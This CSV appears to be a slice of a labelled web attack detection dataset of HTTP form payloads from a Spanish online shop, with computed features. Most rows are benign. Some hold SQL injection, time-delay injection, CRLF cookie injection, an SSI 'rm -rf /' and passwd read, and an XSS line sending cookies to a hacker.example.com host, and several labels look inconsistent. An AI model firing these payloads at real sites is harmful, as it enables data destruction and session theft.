row_id,payload,category,needs_review,length,has_quotes,has_angle_brackets,has_path,has_cmd,priority,kb_family,char_len_computed,length_matches_computed,line_break_count,pipe_field_count_approx,space_ratio,digit_ratio,unique_char_ratio,shannon_entropy_bits,has_http_version_tail,contains_http_version_token,field_delimiter_style,quoted_csv_like_wrapping,application_injection_context,application_context_unknown_reason,percent_escape_count,percent_encoding_density,encoding_surface_class,has_double_percent_encoding,has_null_percent,has_crlf_encoded_or_literal,heuristic_pattern_band,label_consistency_flag
933,insertar | 4975 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium,cmd,42,yes,0,3,0.16666666666666666,0.14285714285714285,0.5476190476190477,4.171814448282569,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
934,insertar | 4975 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium,cmd,41,yes,0,3,0.17073170731707318,0.14634146341463414,0.5609756097560976,4.156061152695156,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
935,registro | ingeberg | sahumador | Silveria | Giglio Beitia | malik@clubdeviaje.so | 90164620C| | Calle Agustin Parejo S/N  | Tierzo | 45214 | Cuenca | 1661352474337104 | Registrar HTTP/1.1,cmd,no,188,0,0,0,1,low,cmd,188,yes,0,14,0.1595744680851064,0.16489361702127658,0.23404255319148937,4.799185359818271,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
936,registro | ingeberg | sahumador | Silveria | Giglio Beitia | malik@clubdeviaje.so | 90164620C | Calle Agustin Parejo S/N  | ?Valdunq.uill*o | 45214 | Cuenca | 1661352474337104 | Registrar HTTP/1.1,cmd,no,196,0,0,0,1,low,cmd,196,yes,0,13,0.15306122448979592,0.15816326530612246,0.23979591836734693,4.886146809447486,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
937,registro | ingeberg | sahumador | Silveria | Giglio Beitia | malik@clubdeviaje.so | 90164620C | Calle Agustin Parejo S/N  | Tierzo | 45214 | Cuenca | 1661352474337104 | Registrar HTTP/1.1,cmd,no,187,0,0,0,1,low,cmd,187,yes,0,13,0.16042780748663102,0.1657754010695187,0.23529411764705882,4.803954940409666,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
938,entrar | cupid | ar9ada | on' DELETE FROM USERS | Entrar HTTP/1.1,cmd,no,65,1,0,0,1,medium,cmd,65,yes,0,5,0.18461538461538463,0.046153846153846156,0.46153846153846156,4.401471714008589,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
939,entrar | cupid | %20 | on | Entrar HTTP/1.1,cmd,no,43,0,0,0,1,medium,cmd,43,yes,0,5,0.20930232558139536,0.09302325581395349,0.5348837209302325,4.094073765977813,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",1,0.023255813953488372,ascii_with_percent_encoding,False,False,False,unknown,no_keyword_pattern_matched
940,entrar | ??horst?6 | ar9ada | on | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium,cmd,50,yes,0,5,0.18,0.08,0.42,3.9655881298100253,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
941,Credenciales incorrectas'OR'a='a HTTP/1.1,other,no,41,1,0,0,0,medium,other,41,yes,0,1,0.04878048780487805,0.04878048780487805,0.5609756097560976,4.326706577630513,True,True,no_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,not_applicable,not_applicable
942,insertar | 2681 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium,cmd,42,yes,0,3,0.16666666666666666,0.14285714285714285,0.5238095238095238,4.106221888707248,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
943,insertar | 2681 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium,cmd,41,yes,0,3,0.17073170731707318,0.14634146341463414,0.5365853658536586,4.088868774593608,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
944,registro | farand | 5o70e14ir | Geovana | Figuera Alonso | bozzufi_persoff@tardos.name | 76657172N | Casas Cementerio 33  | Villanueva de los Caballeros | 37291 | Zaragoza | 3509344027526428 | Registrar HTTP/1.1,cmd,no,211,0,0,0,1,low,cmd,211,yes,0,13,0.15165876777251186,0.18009478672985782,0.2132701421800948,4.7982574087085705,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
945,"registro | plsntp1 | c!uartilludo | Generosa | Obrador Scolari | metanee4@martosfutbolsala.us | 55023331V | Cuesta De La Independencia 107 7?H | Bastida, La | 50268 | Guadalajara | 7559315491846404sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> | Registrar HTTP/1.1",xss,no,352,1,1,0,1,low,xss,352,yes,0,13,0.09943181818181818,0.1278409090909091,0.17045454545454544,5.119084399753963,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,script_tag_evidence,pattern_supports_family
946,"registro | plsntp1 | c!uartilludo | Generosa | Obrador Scolari | metanee4@martosfutbolsala.us | 55023331V | Cuesta De La Independencia 107 7?H | Bastida, La | 50268 | Guadalajara | 7559315491846404 | Registrar HTTP/1.1",cmd,no,218,0,0,0,1,low,cmd,218,yes,0,13,0.14678899082568808,0.16972477064220184,0.22477064220183487,4.878424273805374,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
947,"entrar | reiman"" AND ""1""=""1 | 7asto | off | Entrar HTTP/1.1",cmd,no,59,1,0,0,1,medium,cmd,59,yes,0,5,0.1864406779661017,0.0847457627118644,0.423728813559322,4.201741976755502,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
948,entrar | reiman | 7asto | on/ | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium,cmd,47,yes,0,5,0.19148936170212766,0.06382978723404255,0.40425531914893614,3.8759962348780395,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
949,entrar | reiman | 7asto | off | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium,cmd,47,yes,0,5,0.19148936170212766,0.06382978723404255,0.425531914893617,3.945041181640519,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
950,insertar | 6840any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | Confirmar HTTP/1.1,cmd,no,87,0,0,0,1,low,cmd,87,yes,0,3,0.05747126436781609,0.3333333333333333,0.42528735632183906,4.979055605776415,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",4,0.04597701149425287,ascii_with_percent_encoding,False,False,False,header_injection_token_evidence,pattern_supports_family
951,insertar | 6840 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium,cmd,42,yes,0,3,0.16666666666666666,0.14285714285714285,0.5476190476190477,4.171814448282569,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
952,insertar | 6840 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium,cmd,36,yes,0,3,0.1388888888888889,0.16666666666666666,0.6388888888888888,4.291879432707956,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
953,"registro | dajerlin | 3O172A1I0m6n19 | Carmen | Bordas Rubies | carves@travelzone.hn | 59561138Q | Calle Morera, 139, 8G | Funes | 17143 | Toledo | 9899066630450137'OR'a='a | Registrar HTTP/1.1",cmd,no,193,1,0,0,1,low,cmd,193,yes,0,13,0.15025906735751296,0.22797927461139897,0.25906735751295334,4.95486853248716,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
954,"registro | dajerlin | 3O172A1I0m6n19 | any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | Bordas Rubies | carves@travelzone.hn | 59561138Q | Calle Morera, 139, 8G | Funes | 17143 | Toledo | 9899066630450137 | Registrar HTTP/1.1",cmd,no,230,0,0,0,1,low,cmd,230,yes,0,13,0.12608695652173912,0.29130434782608694,0.24347826086956523,5.131426584530853,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",4,0.017391304347826087,ascii_with_percent_encoding,False,False,False,header_injection_token_evidence,pattern_supports_family
955,"registro | dajerlin | 3O172A1I0m6n19 | Vi,ta | Bordas Rubies | carves@travelzone.hn | 59561138Q | Calle Morera, 139, 8G | Funes | 17143 | Toledo | 9899066630450137 | Registrar HTTP/1.1",cmd,no,184,0,0,0,1,low,cmd,184,yes,0,13,0.15760869565217392,0.2391304347826087,0.266304347826087,4.902720856305472,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
956,"registro | dajerlin | 3O172A1I0m6n19 | Carmen | Bordas Rubies | carves@travelzone.hn | 59561138Q | Calle Morera, 139, 8G | Funes | 17143 | Toledo | 9899066630450137 | Registrar HTTP/1.1",cmd,no,185,0,0,0,1,low,cmd,185,yes,0,13,0.15675675675675677,0.23783783783783785,0.2594594594594595,4.880973214735139,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
957,"entrar | ca,the | ZapardA | off | Entrar HTTP/1.1",cmd,no,49,0,0,0,1,medium,cmd,49,yes,0,5,0.1836734693877551,0.04081632653061224,0.46938775510204084,4.094230385665863,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
958,entrar | dipace | ZapardA | off | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium,cmd,49,yes,0,5,0.1836734693877551,0.04081632653061224,0.4489795918367347,4.068819926526342,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
959,insertar | 9111  | Confirmar HTTP/1.1,cmd,no,37,0,0,0,1,medium,cmd,37,yes,0,3,0.16216216216216217,0.16216216216216217,0.5405405405405406,3.990009704040741,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
960,insertar | 9111 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium,cmd,37,yes,0,3,0.13513513513513514,0.16216216216216217,0.5405405405405406,4.041364691335069,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
961,insertar | 9111 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium,cmd,36,yes,0,3,0.1388888888888889,0.16666666666666666,0.5555555555555556,4.024944975084711,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
962,2 | Queso Manchego | 100 | 34 | %3F HTTP/1.1,cmd,no,44,0,0,0,1,medium,cmd,44,yes,0,5,0.22727272727272727,0.20454545454545456,0.5681818181818182,4.187291426568272,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",1,0.022727272727272728,ascii_with_percent_encoding,False,False,False,unknown,no_keyword_pattern_matched
963,entrar | any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727%0D%0A | vEnEcIANa | off | Entrar HTTP/1.1,cmd,no,105,0,0,0,1,low,cmd,105,yes,0,5,0.08571428571428572,0.26666666666666666,0.37142857142857144,4.9180507567871175,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",7,0.06666666666666667,ascii_with_percent_encoding,False,False,False,header_injection_token_evidence,pattern_supports_family
964,entrar | katina | vEnEcIANa | off/ | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium,cmd,52,yes,0,5,0.17307692307692307,0.038461538461538464,0.4423076923076923,4.1302716317613895,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
965,entrar | katina | vEnEcIANa | off | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium,cmd,51,yes,0,5,0.17647058823529413,0.0392156862745098,0.45098039215686275,4.110685332329445,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
966,1paros%22%20style=%22background:url(javascript:alert('Paros')) HTTP/1.1,encoded attack,no,71,1,0,0,0,medium,encoded_attack,71,yes,0,1,0.014084507042253521,0.1267605633802817,0.4788732394366197,4.820118556210203,True,True,no_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",3,0.04225352112676056,ascii_with_percent_encoding,False,False,False,high_percent_encoding_density,pattern_supports_family
967,insertar | 7363 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium,cmd,42,yes,0,3,0.16666666666666666,0.14285714285714285,0.5238095238095238,4.124195400663521,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
968,insertar | 7363 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium,cmd,41,yes,0,3,0.17073170731707318,0.14634146341463414,0.5365853658536586,4.107280664890278,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
969,entrar | bienek | memoriosaany%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 | off | Entrar HTTP/1.1,cmd,no,102,0,0,0,1,low,cmd,102,yes,0,5,0.08823529411764706,0.24509803921568626,0.38235294117647056,4.933078686240098,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",4,0.0392156862745098,ascii_with_percent_encoding,False,False,False,header_injection_token_evidence,pattern_supports_family
970,entrar | bienek | cloqu'e/ro | off | Entrar HTTP/1.1,cmd,no,52,1,0,0,1,medium,cmd,52,yes,0,5,0.17307692307692307,0.038461538461538464,0.46153846153846156,4.207194708684466,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
971,insertar | 9611 | Confirmar' DELETE FROM USERS HTTP/1.1,cmd,no,55,1,0,0,1,medium,cmd,55,yes,0,3,0.14545454545454545,0.10909090909090909,0.5636363636363636,4.6039981225762325,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
972,insertar | 9611 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium,cmd,36,yes,0,3,0.1388888888888889,0.16666666666666666,0.5833333333333334,4.125212766041289,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
973,registro | tsolas  | c3763ativa.m4n3e | Frida | Llagostera Llaveria | cockneys@drae2.tl | 11939364H | Calle Alava 17 12?C | Sada | 25139 | Zaragoza | 3664449984112984 | Registrar HTTP/1.1,cmd,no,187,0,0,0,1,low,cmd,187,yes,0,13,0.16042780748663102,0.22459893048128343,0.22459893048128343,4.701620784686831,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
974,registro | tsolas | c3763ativa.m4n3e | Frida | Llagostera Llaveria | cockneys@drae2.tl | 11939364H | Calle Alava 17 12?C | Sada | 25139 | Zaragoza | 754521418329140A | Registrar HTTP/1.1,cmd,no,186,0,0,0,1,low,cmd,186,yes,0,13,0.15591397849462366,0.22043010752688172,0.23118279569892472,4.743467087003957,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
975,registro | tsolas | c3763ativa.m4n3e | Frida | Llagostera Llaveria | cockneys@drae2.tl | 11939364H | Calle Alava 17 12?C | Sada | 25139 | Zaragoza | 3664449984112984 | Registrar HTTP/1.1,cmd,no,186,0,0,0,1,low,cmd,186,yes,0,13,0.15591397849462366,0.22580645161290322,0.22580645161290322,4.712594788242468,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
976,"3 | Vino Rioja | 85 | 80 | ""><!--#EXEC cmd=""dir ""-->< HTTP/1.1",sql,no,62,1,1,0,1,medium,sql,62,yes,0,5,0.1935483870967742,0.11290322580645161,0.532258064516129,4.590820100500087,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
977,entrar | hope | infR06g9ble | ');waitfor delay '0:0:15';-- | Entrar HTTP/1.1,sql,no,76,1,0,0,1,medium,sql,76,yes,0,5,0.14473684210526316,0.11842105263157894,0.4605263157894737,4.755324542519054,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,time_based_or_delay_primitive,pattern_supports_family
978,entrar | mu'enst/er | infR06g9ble | on | Entrar HTTP/1.1,cmd,no,56,1,0,0,1,medium,cmd,56,yes,0,5,0.16071428571428573,0.08928571428571429,0.5,4.36979253877157,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
979,entrar | hope | infR06g9ble | on | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium,cmd,50,yes,0,5,0.18,0.1,0.52,4.298171939471839,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
980,"1<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1",sql,no,54,1,1,0,1,medium,sql,54,yes,0,1,0.1111111111111111,0.05555555555555555,0.5,4.4839765672914185,True,True,no_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
981,any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | 20 | Pasar por caja HTTP/1.1,cmd,no,82,0,0,0,1,low,cmd,82,yes,0,3,0.08536585365853659,0.32926829268292684,0.43902439024390244,4.878280968689452,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",4,0.04878048780487805,ascii_with_percent_encoding,False,False,False,header_injection_token_evidence,pattern_supports_family
982,insertar | 20 | Confirmar/ HTTP/1.1,cmd,no,35,0,0,0,1,medium,cmd,35,yes,0,3,0.14285714285714285,0.11428571428571428,0.6,4.1690075748182,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
983,"registro | bagnato33 | prescindible | Hiram','0','0','0','0');waitfor delay '0:0:15';-- | Penagos Pijoan | fenell@salsaspain.fr | 11130412E | C/ Leon Pinelo, 5 3E | Cordovilla | 10320 | Navarra | 2582130639764727 | Registrar HTTP/1.1",sql,no,233,1,0,0,1,low,sql,233,yes,0,13,0.13733905579399142,0.18454935622317598,0.21030042918454936,4.962947100483814,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,time_based_or_delay_primitive,pattern_supports_family
984,"registro | l,lywelly | prescindible | Hiram | Penagos Pijoan | fenell@salsaspain.fr | 11130412E | C/ Leon Pinelo, 5 3E | Cordovilla | 10320 | Navarra | 2582130639764727 | Registrar HTTP/1.1",cmd,no,189,0,0,0,1,low,cmd,189,yes,0,13,0.15873015873015872,0.1746031746031746,0.2328042328042328,4.78454316647468,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
985,"registro | bagnato33 | prescindible | Hiram | Penagos Pijoan | fenell@salsaspain.fr | 11130412E | C/ Leon Pinelo, 5 3E | Cordovilla | 10320 | Navarra | 2582130639764727 | Registrar HTTP/1.1",cmd,no,189,0,0,0,1,low,cmd,189,yes,0,13,0.15873015873015872,0.18518518518518517,0.2222222222222222,4.743809704487991,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
986,entrar | toshachany%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | qUeR4N55a | off | Entrar HTTP/1.1,cmd,no,103,0,0,0,1,low,cmd,103,yes,0,5,0.08737864077669903,0.27184466019417475,0.4077669902912621,5.041459843362195,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",4,0.038834951456310676,ascii_with_percent_encoding,False,False,False,header_injection_token_evidence,pattern_supports_family
987,entrar | toshach | qUeR4N55a | paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 | Entrar HTTP/1.1,cmd,no,131,0,0,0,1,low,cmd,131,yes,0,5,0.06870229007633588,0.19083969465648856,0.3511450381679389,4.993618818269006,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",11,0.08396946564885496,ascii_with_percent_encoding,False,False,False,unknown,no_keyword_pattern_matched
